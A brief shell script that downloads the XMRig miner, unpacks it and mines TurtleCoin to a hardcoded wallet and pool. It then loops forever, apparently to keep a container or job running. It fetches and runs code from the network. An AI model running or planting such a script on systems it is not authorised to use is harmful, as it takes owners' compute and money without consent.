#!/bin/sh
 wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz
cd xmrig-6.15.1
./xmrig -o de.turtlecoin.herominers.com:1160 -u TRTLuy8jQA1Kr3FbSg2oXtgNctpeFTVQKWhNoyiZ3iiUbn818Hq7L4ChMm7ygMktqQCnBV2fymQnbcSnqMc489RmgJmQ7MsBmYw -p turtleman -k -a argon2/chukwav2
while [ 1 ]; do
sleep 3
done
sleep 999
